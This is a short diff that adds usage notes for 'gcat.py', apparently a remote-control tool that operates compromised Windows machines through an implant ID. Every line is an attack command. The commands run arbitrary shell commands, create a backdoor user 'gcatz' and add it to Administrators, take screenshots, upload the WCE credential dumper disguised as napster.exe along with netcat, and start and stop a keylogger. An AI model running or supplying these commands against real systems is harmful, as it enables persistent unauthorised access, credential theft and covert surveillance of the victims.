@@ -1,0 +1,33 @@
+
+
+# Get basic host information
+python gcat.py -id 69884621-bd0b-58f8-9692-16b25cd8552c -info
+
+# Execute cmd
+python gcat.py -id 69884621-bd0b-58f8-9692-16b25cd8552c -cmd "net user"
+
+# Execute cmd
+python gcat.py -id 69884621-bd0b-58f8-9692-16b25cd8552c -cmd "net user gcatz /add"
+python gcat.py -id 69884621-bd0b-58f8-9692-16b25cd8552c -cmd "net localgroup \"Administrators\" gcatz /add"
+
+# Get response
+python gcat.py -id 69884621-bd0b-58f8-9692-16b25cd8552c -jobid Xcyp4u5
+
+
+
+# Screenshot
+python gcat.py -id 69884621-bd0b-58f8-9692-16b25cd8552c -screenshot
+
+# Upload a file - *malicious files will fail*
+python gcat.py -id 69884621-bd0b-58f8-9692-16b25cd8552c -upload '/usr/share/wce-universal.exe' 'c:\tools\napster.exe'
+
+python gcat.py -id 69884621-bd0b-58f8-9692-16b25cd8552c -upload '/usr/share/windows-binaries/nc.exe' 'c:\tools\nc.exe'
+
+# Start keylogger
+python gcat.py -id 69884621-bd0b-58f8-9692-16b25cd8552c -start-keylogger
+
+
+
+# Stop keylogger
+python gcat.py -id 69884621-bd0b-58f8-9692-16b25cd8552c -stop-keylogger
+
